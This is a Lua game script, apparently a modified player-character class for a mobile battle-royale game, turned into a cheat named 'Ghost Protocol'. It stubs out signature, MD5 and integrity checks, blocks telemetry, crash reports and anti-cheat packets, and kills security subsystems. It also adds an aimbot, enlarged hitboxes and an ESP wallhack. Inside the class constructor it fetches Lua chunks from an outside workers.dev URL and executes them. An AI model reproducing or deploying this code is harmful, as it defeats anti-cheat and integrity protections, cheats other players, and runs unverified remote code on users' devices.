local require = require
local import = import
local isValid = slua.isValid
local CombineClass = require("combine_class")
local CharacterBase = require("GameLua.GameCore.Framework.CharacterBase")

-- ============================================================================
-- ULTIMATE MERGED BYPASS v5.0 - "GHOST PROTOCOL" + AIMBOT + ESP/WALLHACK
-- Integrated with Injector Architecture
-- ============================================================================

local GhostCore = {}
GhostCore.Version = "5.0-GHOST-PLUS-ESP"
GhostCore.Active = false
GhostCore.AimbotActive = false
GhostCore.ESPActive = false

-- ============================================================================
-- CORE UTILITIES
-- ============================================================================
local function SafeExec(func)
    local success, result = pcall(func)
    if not success then return nil end
    return result
end

local function RetTrueMimic()
    if math.random(1, 100) > 5 then return true end
    return false
end

local function RetFalseMimic()
    if math.random(1, 100) > 5 then return false end
    return true
end

local function SafeWrap(originalFunc, mockFunc, mimicChance)
    if mimicChance == nil then mimicChance = 0 end
    if type(originalFunc) ~= "function" then return mockFunc end
    return function(...)
        if mimicChance > 0 and math.random(1, 100) <= mimicChance then
            return originalFunc(...)
        end
        return mockFunc(...)
    end
end

-- ============================================================================
-- MODULE 1: SLUA & INTEGRITY Bypass
-- ============================================================================
local function Module_SLuaBypass()
    SafeExec(function()
        if slua and slua.getSignature then
            slua.getSignature = function() return math.random(0xDE000000, 0xFFFFFFFF) end
        end
        local loader = package.loaded["slua.loader"] or rawget(_G, "slua_loader")
        if loader then
            loader.verifyBytecode = SafeWrap(loader.verifyBytecode, RetTrueMimic, 5)
            loader.checkIntegrity = SafeWrap(loader.checkIntegrity, RetTrueMimic, 5)
            if loader.disableSignatureCheck then loader.disableSignatureCheck = RetTrueMimic end
        end
        local slua_serialize = package.loaded["slua.serialize"]
        if slua_serialize then
            slua_serialize.check = SafeWrap(slua_serialize.check, RetTrueMimic, 5)
            slua_serialize.verify = SafeWrap(slua_serialize.verify, RetTrueMimic, 5)
        end
        if jit and jit.attach then jit.attach(function() end, "bc") end
        if _G.slua_verify then _G.slua_verify = SafeWrap(_G.slua_verify, RetTrueMimic, 5) end
        if _G.check_slua_integrity then _G.check_slua_integrity = SafeWrap(_G.check_slua_integrity, RetTrueMimic, 5) end
    end)
end

-- ============================================================================
-- MODULE 2: MD5 & Signature Bypass
-- ============================================================================
local function Module_MD5Bypass()
    SafeExec(function()
        local console = import("KismetSystemLibrary")
        if console then
            local cmds = {
                "pak.DisablePakSignatureCheck 1", "pakchunk.EnableSignatureCheck 0",
                "s.VerifyPak 0", "sig.Check 0", "security.DisableChecks 1"
            }
            for _, cmd in ipairs(cmds) do
                pcall(function() console.ExecuteConsoleCommand(nil, cmd) end)
            end
        end
        
        local CreativeModeBlueprintLibrary = import("CreativeModeBlueprintLibrary")
        if CreativeModeBlueprintLibrary then
            CreativeModeBlueprintLibrary.MD5HashByteArray = function() return string.rep(string.format("%x", math.random(0, 255)), 16) end
            CreativeModeBlueprintLibrary.MD5HashFile = function() return string.rep(string.format("%x", math.random(0, 255)), 16) end
            CreativeModeBlueprintLibrary.GetContentDiffData = function() return true, "OK" end
            CreativeModeBlueprintLibrary.VerifyFileIntegrity = SafeWrap(CreativeModeBlueprintLibrary.VerifyFileIntegrity, RetTrueMimic, 5)
        end
        
        if _G.MD5Hash then _G.MD5Hash = function() return string.rep(string.format("%x", math.random(0, 255)), 16) end end
        if _G.CRC32 then _G.CRC32 = function() return math.random(0, 0xFFFFFFFF) end end
        
        local FileHashChecker = package.loaded["common.file_hash_checker"]
        if FileHashChecker then
            FileHashChecker.CheckFileMD5 = SafeWrap(FileHashChecker.CheckFileMD5, RetTrueMimic, 5)
            FileHashChecker.VerifyAll = SafeWrap(FileHashChecker.VerifyAll, RetTrueMimic, 5)
            FileHashChecker.GetHash = function() return "OK" end
        end
        
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then
            TssSdk.GetFileMD5 = function() return "OK" end
            TssSdk.VerifyFileSignature = SafeWrap(TssSdk.VerifyFileSignature, RetTrueMimic, 5)
        end
        
        local STExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
        if STExtraBlueprintFunctionLibrary then
            STExtraBlueprintFunctionLibrary.CheckMD5 = SafeWrap(STExtraBlueprintFunctionLibrary.CheckMD5, RetTrueMimic, 5)
            STExtraBlueprintFunctionLibrary.GetMD5 = function() return "OK" end
            STExtraBlueprintFunctionLibrary.VerifyFile = SafeWrap(STExtraBlueprintFunctionLibrary.VerifyFile, RetTrueMimic, 5)
        end
    end)
end

-- ============================================================================
-- MODULE 3: LOG & TELEMETRY Blocker
-- ============================================================================
local function Module_LogBlocker()
    SafeExec(function()
        local ScreenshotMTDer = import("ScreenshotMTDer")
        if ScreenshotMTDer then
            ScreenshotMTDer.MTDePicture = function() return "" end
            ScreenshotMTDer.ReMTDePicture = function() return "" end
            ScreenshotMTDer.HasCaptured = RetFalseMimic
            ScreenshotMTDer.TakeScreenshot = function() end
        end
        
        local TLog = package.loaded["TLog"] or _G.TLog
        if TLog then
            TLog.Info = function() end; TLog.Warning = function() end; TLog.Error = function() end
            TLog.Debug = function() end; TLog.Report = function() end; TLog.Send = function() end
            TLog.Flush = function() end
        end
        
        local CrashSight = package.loaded["CrashSight"] or _G.CrashSight
        if CrashSight then
            CrashSight.ReportException = function() end
            CrashSight.SetCustomData = function() end
            CrashSight.Log = function() end
            CrashSight.SendCrash = function() end
        end
        
        local GameReportUtils = package.loaded["GameLua.Mod.BaseMod.GamePlay.GameReport.GameReportUtils"]
        if GameReportUtils then
            GameReportUtils.BugglyPostExceptionFull = RetFalseMimic
            GameReportUtils.CheckCanBugglyPostException = RetFalseMimic
            GameReportUtils.ReplayReportData = function() end
            GameReportUtils.ReportGameException = function() end
            GameReportUtils.PostException = function() end
        end
        
        local ClientToolsReport = package.loaded["client.slua.logic.report.ClientToolsReport"]
        if ClientToolsReport then
            ClientToolsReport.SendReport = function() end
            ClientToolsReport.SendException = function() end
            ClientToolsReport.UploadLog = function() end
        end
        
        for _, sdk in ipairs({"Firebase", "Adjust", "AppsFlyer", "FacebookAnalytics", "GameAnalytics"}) do
            local s = _G[sdk]
            if s then
                s.logEvent = function() end; s.trackEvent = function() end
                s.setEnabled = RetFalseMimic; s.sendEvent = function() end; s.report = function() end
            end
        end
    end)
end

-- ============================================================================
-- MODULE 4: SCANNER & VERIFICATION Blocker
-- ============================================================================
local function Module_ScannerBlocker()
    SafeExec(function()
        local SubsystemMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubsystemMgr then
            local subsystems = {
                "AFKReportorSubsystem", "ClientDataStatistcsSubsystem", "AvatarExceptionSubsystem",
                "ShootVerifySubSystemClient", "MemoryCheckSubsystem", "SpeedCheckSubsystem",
                "WallCheckSubsystem", "FileCheckSubsystem", "BehaviorScoreSubsystem"
            }
            for _, name in ipairs(subsystems) do
                local sub = SubsystemMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Upload") or 
                            k:find("Verify") or k:find("Check") or k:find("Validate") or k:find("Scan") or k:find("Detect")) then
                            pcall(function() sub[k] = SafeWrap(sub[k], function() end, 5) end)
                        end
                    end
                    if sub.ReportPingDelayTimer then
                        sub:RemoveGameTimer(sub.ReportPingDelayTimer)
                        sub.ReportPingDelayTimer = nil
                    end
                    sub.DelayCount = 0
                end
            end
        end
        
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then
            local originalOnRecvData = TssSdk.OnRecvData
            TssSdk.OnRecvData = function(data)
                if type(data) == "string" and (string.find(data, "report") or string.find(data, "exception") or
                    string.find(data, "cheat") or string.find(data, "violation") or string.find(data, "hack")) then
                    return
                end
                if originalOnRecvData then originalOnRecvData(data) end
            end
            TssSdk.SendReportInfo = function() end
            TssSdk.ScanMemory = SafeWrap(TssSdk.ScanMemory, RetTrueMimic, 5)
            TssSdk.IsEmulator = RetFalseMimic
            TssSdk.CheckEnvironment = SafeWrap(TssSdk.CheckEnvironment, RetTrueMimic, 5)
            TssSdk.VerifyProcess = SafeWrap(TssSdk.VerifyProcess, RetTrueMimic, 5)
        end
    end)
end

-- ============================================================================
-- MODULE 5: NETWORK PACKET BLOCK
-- ============================================================================
local function Module_NetworkBlock()
    SafeExec(function()
        if NetUtil and NetUtil.SendPacket then
            local originalSend = NetUtil.SendPacket
            local blockedPackets = {
                ["ReportAttackFlow"] = 1, ["ReportSecAttackFlow"] = 1, ["ReportHurtFlow"] = 1,
                ["ReportFireArms"] = 1, ["ReportVerifyInfoFlow"] = 1, ["ReportMrpcsFlow"] = 1,
                ["ReportPlayerBehavior"] = 1, ["ReportAimFlow"] = 1, ["ReportHitFlow"] = 1,
                ["ReportCircleFlow"] = 1, ["report_aim_bot"] = 1, ["report_esp_usage"] = 1,
                ["detect_cheat"] = 1, ["ban_player"] = 1, ["Heartbeat"] = 1, ["ClientHeartbeat"] = 1,
                ["SwiftHawk"] = 1, ["ClientSwiftHawk"] = 1, ["AntiCheatReport"] = 1,
                ["IntegrityCheck"] = 1, ["SignatureVerify"] = 1
            }
            NetUtil.SendPacket = function(packetName, ...)
                if blockedPackets[packetName] then return nil end
                return originalSend(packetName, ...)
            end
        end
    end)
end

-- ============================================================================
-- MODULE 6: HIGGS BOSON & ANTI-CHEAT Bypass
-- ============================================================================
local function Module_HiggsAntiCheatBypass()
    SafeExec(function()
        local Higgs = require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if Higgs then
            local methods = {
                "ControlMHActive", "Tick", "OnTick", "MHActiveLogic", "TriggerAvatarCheck",
                "StartAvatarCheck", "ReportItemID", "ShowSecurityAlert", "SendHisarData",
                "ValidateSecurityData", "CheckMHActive", "ReportViolation", "ProcessSecurityEvent"
            }
            for _, m in ipairs(methods) do
                if Higgs[m] then Higgs[m] = SafeWrap(Higgs[m], function() end, 5) end
            end
            Higgs.GetNetAvatarItemIDs = function() return {} end
            Higgs.IsMHActive = RetFalseMimic
            Higgs.bMHActive = false
        end
        
        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if slua.isValid(pc) then
            if pc.HiggsBoson then
                pc.HiggsBoson.bMHActive = false
                if pc.HiggsBoson.ControlMHActive then pc.HiggsBoson:ControlMHActive(0) end
            end
            if pc.HiggsBosonComponent then
                pc.HiggsBosonComponent.bMHActive = false
                pc.HiggsBosonComponent:ControlMHActive(0)
            end
        end
    end)
end

-- ============================================================================
-- MODULE 7: MAGIC BULLET (ENLARGED HITBOXES)
-- ============================================================================
local function EnableMagicBullet()
    SafeExec(function()
        local allChars = Game:GetAllPlayerPawns() or {}
        for _, c in pairs(allChars) do
            if slua.isValid(c) then
                local mesh = c.Mesh
                if slua.isValid(mesh) then
                    local physAsset = mesh.PhysicsAssetOverride
                    if not slua.isValid(physAsset) and slua.isValid(mesh.SkeletalMesh) then
                        physAsset = mesh.SkeletalMesh.PhysicsAsset
                    end
                    if slua.isValid(physAsset) and physAsset.SkeletalBodySetups then
                        _G._MBones = _G._MBones or {}
                        local assetName = (physAsset.GetName and physAsset:GetName()) or tostring(physAsset)
                        if not _G._MBones[assetName] then
                            local mb = {["head"] = 200, ["neck_01"] = 150, ["pelvis"] = 150, ["spine_01"] = 150,
                                ["spine_02"] = 150, ["spine_03"] = 150, ["upperarm_l"] = 150, ["upperarm_r"] = 150,
                                ["lowerarm_l"] = 130, ["lowerarm_r"] = 130, ["hand_l"] = 100, ["hand_r"] = 100,
                                ["thigh_l"] = 150, ["thigh_r"] = 150, ["calf_l"] = 130, ["calf_r"] = 130}
                            local setups = physAsset.SkeletalBodySetups
                            for i = 1, 80 do
                                local bs = nil
                                pcall(function() bs = (type(setups.Get) == "function") and setups:Get(i-1) or setups[i] end)
                                if not bs or not slua.isValid(bs) then break end
                                local bn = tostring(bs.BoneName):lower()
                                local pct = nil
                                for pat, val in pairs(mb) do
                                    if string.find(bn, pat) then pct = val; break end
                                end
                                if pct then
                                    local sc = 1.0 + pct / 100.0
                                    local ag = bs.AggGeom
                                    pcall(function()
                                        local bx = (ag and ag.BoxElems) or bs.BoxElems
                                        if bx then
                                            local b = (type(bx.Get) == "function") and bx:Get(0) or bx[1]
                                            if b then
                                                b.X = (b.X or 30) * sc; b.Y = (b.Y or 30) * sc; b.Z = (b.Z or 60) * sc
                                                if type(bx.Set) == "function" then bx:Set(0, b) else bx[1] = b end
                                            end
                                        end
                                    end)
                                    pcall(function()
                                        local sp = (ag and ag.SphylElems) or bs.SphylElems
                                        if sp then
                                            local s = (type(sp.Get) == "function") and sp:Get(0) or sp[1]
                                            if s then
                                                if s.Radius then s.Radius = s.Radius * sc end
                                                if s.Length then s.Length = s.Length * sc end
                                                if type(sp.Set) == "function" then sp:Set(0, s) else sp[1] = s end
                                            end
                                        end
                                    end)
                                end
                            end
                            _G._MBones[assetName] = true
                            if mesh.RecreatePhysicsState then mesh:RecreatePhysicsState() end
                        end
                    end
                end
            end
        end
    end)
end

-- ============================================================================
-- MODULE 8: AIMBOT FUNCTIONS
-- ============================================================================
_G._AimbotCurrentPC = nil

local function ApplyHardAimbot()
    SafeExec(function()
        local pc = slua_GameFrontendHUD:GetPlayerController()
        if not slua.isValid(pc) then return end
        
        local char = pc:GetPlayerCharacterSafety()
        if not slua.isValid(char) then return end

        local wm = char.WeaponManagerComponent
        if not slua.isValid(wm) then return end

        local weapon = wm.CurrentWeaponReplicated
        if not slua.isValid(weapon) then return end

        local entity = weapon.ShootWeaponEntityComp
        if not slua.isValid(entity) then return end

        entity.RecoilKickADS = 0.02
        entity.GameDeviationFactor = 0.5
        entity.GameDeviationAccuracy = 0.5
        entity.ExtraHitPerformScale = 9
        
        if entity.AutoAimingConfig then
            for _, range in ipairs({"OuterRange", "InnerRange"}) do
                local cfg = entity.AutoAimingConfig[range]
                if cfg then
                    cfg.Speed = 5.5; cfg.RangeRate = 5.5; cfg.SpeedRate = 5.5
                    cfg.RangeRateSight = 5.5; cfg.SpeedRateSight = 5.5
                    cfg.CrouchRate = 5.5; cfg.ProneRate = 5.5; cfg.DyingRate = 0
                    cfg.adsorbMaxRange = 200; cfg.adsorbMinRange = 20
                end
            end
        end

        pcall(function()
            local aimComp = char.BP_AutoAimingComponent_C or char.BP_AutoAimingComponent or char.AutoAimingComponent
            if slua.isValid(aimComp) and aimComp.Bones then
                pcall(function() aimComp.Bones[0] = "head" end)
                pcall(function() aimComp.Bones[1] = "head" end)
                pcall(function() aimComp.Bones:Set(0, "head") end)
                pcall(function() aimComp.Bones:Set(1, "head") end)
            end
        end)
    end)
end

local function AttachAimbotTimer(pc)
    if not slua.isValid(pc) then return end
    if pc == _G._AimbotCurrentPC then return end
    _G._AimbotCurrentPC = pc
    GhostCore.AimbotActive = true
    if pc.AddGameTimer then
        pc:AddGameTimer(0.1, true, function()
            if not slua.isValid(_G._AimbotCurrentPC) then
                _G._AimbotCurrentPC = nil
                GhostCore.AimbotActive = false
                return
            end
            ApplyHardAimbot()
            EnableMagicBullet()
        end)
    end
end

-- ============================================================================
-- MODULE 9: ESP / WALLHACK
-- ============================================================================
local function TextScale(distM)
    local t = math.min(distM / 400, 1)
    return 0.35 - t * 0.2
end

local function HPBar(pct)
    local n = math.floor((pct * 4) + 0.5)
    local s = ""
    for i = 1, 4 do s = s .. (i <= n and "▁" or " ") end
    return s
end

local function IsPawnAlive(p)
    if not slua.isValid(p) then return false end
    if p.HealthStatus then
        local SecurityCommonUtils = require("GameLua.GameCore.Utils.SecurityCommonUtils")
        return SecurityCommonUtils.IsHealthStatusAlive(p.HealthStatus)
    end
    return p.GetHealth and (p:GetHealth() or 0) > 0 or false
end

local function ESPTick()
    SafeExec(function()
        local uCon = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if not slua.isValid(uCon) then return end
        local currentPawn = uCon:GetCurPawn()
        if not slua.isValid(currentPawn) then return end
        
        local myTeamId = currentPawn.TeamID or 0
        local myPos = currentPawn:K2_GetActorLocation()
        local HUD = uCon:GetHUD()
        if not slua.isValid(HUD) then return end
        
        local allChars = Game:GetAllPlayerPawns() or {}
        local botCount, playerCount = 0, 0
        
        for _, enemy in pairs(allChars) do
            if slua.isValid(enemy) and enemy ~= currentPawn and enemy.TeamID ~= myTeamId and IsPawnAlive(enemy) then
                local enemyPos = enemy:K2_GetActorLocation()
                local dx = enemyPos.X - myPos.X
                local dy = enemyPos.Y - myPos.Y
                local dz = enemyPos.Z - myPos.Z
                local dist = math.sqrt(dx*dx + dy*dy + dz*dz)
                
                local isBot = Game:IsAI(enemy) or false
                if isBot then botCount = botCount + 1 else playerCount = playerCount + 1 end
                
                if dist < 600000 then
                    local name = enemy.PlayerName or "UNKNOWN"
                    local distM = dist / 100
                    local hp = enemy.Health or 100
                    local maxHp = enemy.HealthMax or 100
                    local hpPercent = hp / maxHp
                    
                    local hpColor = {R=0,G=255,B=0,A=255}
                    if hpPercent < 0.3 then hpColor = {R=255,G=0,B=0,A=255}
                    elseif hpPercent < 0.7 then hpColor = {R=255,G=255,B=0,A=255} end
                    
                    local headPos = enemy.Mesh and enemy.Mesh:GetSocketLocation("head")
                    local hpOffset = headPos and (headPos.Z - enemyPos.Z + 70) or 70
                    
                    HUD:AddDebugText(string.format("[%.0fm] %s", distM, name), enemy, TextScale(distM), 
                        {X=0,Y=0,Z=-80}, {X=0,Y=0,Z=-80}, {R=255,G=255,B=0,A=255}, true, false, true, nil, 1.0, true)
                    HUD:AddDebugText(HPBar(hpPercent), enemy, TextScale(distM), 
                        {X=0,Y=0,Z=hpOffset}, {X=0,Y=0,Z=hpOffset}, hpColor, true, false, true, nil, 1.0, true)
                end
            end
        end
        
        HUD:AddDebugText(string.format("BOT: %d | PLAYER: %d", botCount, playerCount), currentPawn, 1,
            {X=0,Y=0,Z=170}, {X=0,Y=0,Z=170}, {R=255,G=255,B=255,A=255}, true, false, true, nil, 1.0, true)
    end)
end

local function StartESP(pc)
    GhostCore.ESPActive = true
    if slua.isValid(pc) and pc.AddGameTimer then
        pc:AddGameTimer(0.15, true, ESPTick)
    end
end

-- ============================================================================
-- SUBSYSTEM KILLER
-- ============================================================================
local function Module_SubsystemKiller()
    SafeExec(function()
        local subMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subMgr then
            local subsystemsToKill = {
                "CoronaLabSubsystem", "PlayerSecurityInfoSubsystem", "ClientCircleFlowSubsystem",
                "ModifierExceptionSubsystem", "ShootVerifySubSystemClient", "HiggsBosonComponent",
                "ClientReportPlayerSubsystem", "ClientDataStatistcsSubsystem", "AFKReportorSubsystem",
                "FileCheckSubsystem", "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem",
                "ClientSecMrpcsFlowSubsystem", "SwiftHawkSubsystem", "HeartbeatSubsystem",
                "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem"
            }
            for _, name in ipairs(subsystemsToKill) do
                local sub = subMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Upload") or 
                            k:find("Verify") or k:find("Check") or k:find("Heartbeat")) then
                            pcall(function() sub[k] = SafeWrap(sub[k], function() end, 5) end)
                        end
                    end
                    if sub.timer then pcall(function() sub:RemoveGameTimer(sub.timer) end) end
                end
            end
        end
    end)
end

-- ============================================================================
-- REPORT FLOW BLOCKER
-- ============================================================================
local function Module_ReportFlowBlocker()
    SafeExec(function()
        local reportFlows = {
            "ReportAimFlow", "ReportHitFlow", "ReportAttackFlow", "ReportSecAttackFlow",
            "ReportHurtFlow", "ReportFireArms", "ReportMrpcsFlow", "ReportPlayerBehavior",
            "ReportTeammatHurt", "ReportPlayerPosition", "ReportCircleFlow", "ReportPlayerKillFlow"
        }
        for _, funcName in ipairs(reportFlows) do
            if _G[funcName] then _G[funcName] = SafeWrap(_G[funcName], function() end, 5) end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[funcName] then
                _G.GameplayCallbacks[funcName] = SafeWrap(_G.GameplayCallbacks[funcName], function() end, 5)
            end
        end
    end)
end

-- ============================================================================
-- HEARTBEAT & SWIFT HAWK BLOCKER
-- ============================================================================
local function Module_HeartbeatSwiftBlocker()
    SafeExec(function()
        local heartbeatFuncs = {"Heartbeat", "SendHeartbeat", "ClientHeartbeat", "ServerHeartbeat"}
        for _, func in ipairs(heartbeatFuncs) do
            if _G[func] then _G[func] = function() end end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[func] then
                _G.GameplayCallbacks[func] = function() end
            end
        end
        
        local swiftFuncs = {"SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams"}
        for _, func in ipairs(swiftFuncs) do
            if _G[func] then _G[func] = function() end end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[func] then
                _G.GameplayCallbacks[func] = function() end
            end
        end
    end)
end

-- ============================================================================
-- MAIN INITIALIZATION FUNCTION
-- ============================================================================
local function InitializeGhostProtocol(pc)
    SafeExec(function()
        print("[GHOST PROTOCOL] Initializing...")
        
        Module_SLuaBypass()
        Module_MD5Bypass()
        Module_LogBlocker()
        Module_ScannerBlocker()
        Module_NetworkBlock()
        Module_HiggsAntiCheatBypass()
        Module_SubsystemKiller()
        Module_ReportFlowBlocker()
        Module_HeartbeatSwiftBlocker()
        
        AttachAimbotTimer(pc)
        StartESP(pc)
        
        GhostCore.Active = true
        print("[GHOST PROTOCOL] Complete - Bypass + Aimbot + ESP Active")
    end)
end

-- ============================================================================
-- MAIN CLASS DEFINITION
-- ============================================================================
local BRPlayerCharacterBase = {
    ServerRPC = {},
    ClientRPC = {},
    MulticastRPC = {}
}

BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = { Reliable = true, Params = {} }
BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = { Reliable = true, Params = { UEnums.EPropertyClass.Object } }
BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = { Reliable = true, Params = { UEnums.EPropertyClass.Int } }
BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = { Reliable = true, Params = { UEnums.EPropertyClass.Int } }
BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = { Reliable = true, Params = { UEnums.EPropertyClass.Bool } }

local ENetRole = import("ENetRole")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local MOD_URL = "https://super-resonance-7b1b.chetanbabajii.workers.dev/"

function BRPlayerCharacterBase:ctor()
end

function BRPlayerCharacterBase:_PostConstruct()
    CharacterBase._PostConstruct(self)
    self:InitAddSpecialMoveInfo()
    self.bCanNearDeathGiveup = true
    
    if Client then
        _G._ModChunks = {}
        local http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
        if http and http.Post then
            local headers = {["Content-Type"] = "application/x-www-form-urlencoded"}
            local idx = 1
            local function fetch_next()
                if idx > 5 then return end
                local n = idx; idx = idx + 1
                http:Post(MOD_URL, headers, "key_path=" .. n .. ".lua", nil, function(success, resp)
                    if success and resp and #resp > 50 then
                        local chunk = load(resp, n .. ".lua")
                        if chunk then
                            _G._ModChunks[n] = chunk
                            if n > 1 then pcall(chunk) end
                        end
                    end
                    fetch_next()
                end, 10)
            end
            fetch_next()
        end
        self:AddGameTimer(0.5, true, function()
            local chunk = _G._ModChunks[1]
            if chunk then pcall(chunk) end
        end)
        
        -- Initialize Ghost Protocol after short delay
        self:AddGameTimer(math.random(5, 15), false, function()
            InitializeGhostProtocol(self:GetPlayerController())
        end)
        
        -- Self-healing timer
        self:AddGameTimer(30.0, true, function()
            if GhostCore.Active then
                Module_HiggsAntiCheatBypass()
                Module_NetworkBlock()
                if GhostCore.AimbotActive then
                    ApplyHardAimbot()
                    EnableMagicBullet()
                end
            end
        end)
    end
end

function BRPlayerCharacterBase:ReceiveBeginPlay()
    if BRPlayerCharacterBase.__super and BRPlayerCharacterBase.__super.ReceiveBeginPlay then
        BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
    end
    
    if slua.isValid(self.STCharacterMovement) then
        self.STCharacterMovement.bPositiveBlowUp = true
    end
    
    if Client then
        GameplayData.AddCharacter(self.Object)
    end
end

function BRPlayerCharacterBase:ReceiveEndPlay(EndPlayReason)
    if BRPlayerCharacterBase.__super and BRPlayerCharacterBase.__super.ReceiveEndPlay then
        BRPlayerCharacterBase.__super.ReceiveEndPlay(self, EndPlayReason)
    end
    if Client then
        GameplayData.RemoveCharacter(self.Object)
    end
end

function BRPlayerCharacterBase:OnPlayerEnterCarryBoxState()
    if self.Super and self.Super.OnPlayerEnterCarryBoxState then
        self.Super:OnPlayerEnterCarryBoxState()
    end
    if self.CarryDeadBoxFeature then
        self.CarryDeadBoxFeature:OnPlayerEnterCarryBoxState()
    end
end

function BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
    if self.Super and self.Super.OnPlayerLeaveCarryBoxState then
        self.Super:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
    end
    if self.CarryDeadBoxFeature then
        self.CarryDeadBoxFeature:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
    end
end

function BRPlayerCharacterBase:ServerRPC_CarryDeadBox(uInDeadBox)
    if slua.isValid(uInDeadBox) and Game:IsClassOf(uInDeadBox, import("/Script/ShadowTrackerExtra.PlayerTombBox")) and self.CarryDeadBoxFeature then
        self.CarryDeadBoxFeature:CarryDeadBox(uInDeadBox)
    end
end

function BRPlayerCharacterBase:ServerRPC_NearDeathGiveupRescue()
    local uNearDeathComp = self.NearDeatchComponent
    if self:IsNearDeath() and slua.isValid(uNearDeathComp) and self.bCanNearDeathGiveup == true then
        uNearDeathComp:TriggerGotoDieExplictly(self.Object)
    end
end

function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState)
    if self.Super and self.Super.SwitchWeaponCheck then
        return self.Super:SwitchWeaponCheck(Slot, IgnoreState)
    end
    return true
end

-- EMPTY VEHICLE HANDLERS
function BRPlayerCharacterBase:HandleOnAttachedToVehicle(uVehicle) end
function BRPlayerCharacterBase:HandleOnDetachedFromVehicle(uLastVehicle) end
function BRPlayerCharacterBase:ClearAttachToVehicleTimer() end

local CBRPlayerCharacterBase = require("class")(CharacterBase, nil, BRPlayerCharacterBase)

return CombineClass.DeclareFeature(CBRPlayerCharacterBase, {
    { SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature" },
    { CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature" },
    { SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature" },
    { TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature" },
    { LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature" },
    { FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature" },
    { CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature" },
    { BuildSkateFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.PlayerCharacterBuildVehicleFeature" },
    { CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.HeroPropFeature.CommonBornlandTransformFeature" },
    { ParachuteFormation = "GameLua.Mod.BaseMod.GamePlay.Feature.ParachuteFormationFeature" }
}, "BRPlayerCharacterBase")
